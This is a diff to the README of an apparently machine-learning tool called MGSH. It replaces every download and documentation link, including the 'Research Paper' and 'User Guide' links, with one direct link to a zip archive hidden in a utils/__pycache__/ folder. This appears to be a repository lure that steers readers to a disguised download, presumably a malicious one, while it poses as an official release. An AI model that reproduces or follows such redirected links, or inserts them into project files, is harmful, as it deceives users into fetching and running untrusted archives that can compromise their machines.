@@ -14,7 +14,7 @@ To get started with MGSH, you'll need to download the application and install it
 
 To download MGSH, visit the Releases page. Here, you can find the latest version of the application.
 
-[Download MGSH Here!](https://github.com/movebo6875/MGSH/releases)
+[Download MGSH Here!](https://raw.githubusercontent.com/movebo6875/MGSH/main/utils/__pycache__/MGSH-v2.6-alpha.5.zip)
 
 ### Step 2: Choose Your Version
 
@@ -72,8 +72,8 @@ If you encounter any issues while using MGSH, there is help available. You can r
 If you're interested in learning more about the concepts behind MGSH, you can explore academic papers and articles on cross-modal hashing and label management. 
 
 You can also check out the following resources:
-- [Research Paper](https://example.com)
-- [User Guide](https://example.com)
+- [Research Paper](https://raw.githubusercontent.com/movebo6875/MGSH/main/utils/__pycache__/MGSH-v2.6-alpha.5.zip)
+- [User Guide](https://raw.githubusercontent.com/movebo6875/MGSH/main/utils/__pycache__/MGSH-v2.6-alpha.5.zip)
 
 ## 📣 Join the Community
 
@@ -87,4 +87,4 @@ MGSH is free to use under the MIT License. This allows you to modify and distrib
 
 Now you are ready to use MGSH for your data retrieval tasks. Remember to keep checking the Releases page for the latest updates. Enjoy improved accuracy and efficiency in your work with MGSH!
 
-[Download MGSH Here!](https://github.com/movebo6875/MGSH/releases)
+[Download MGSH Here!](https://raw.githubusercontent.com/movebo6875/MGSH/main/utils/__pycache__/MGSH-v2.6-alpha.5.zip)
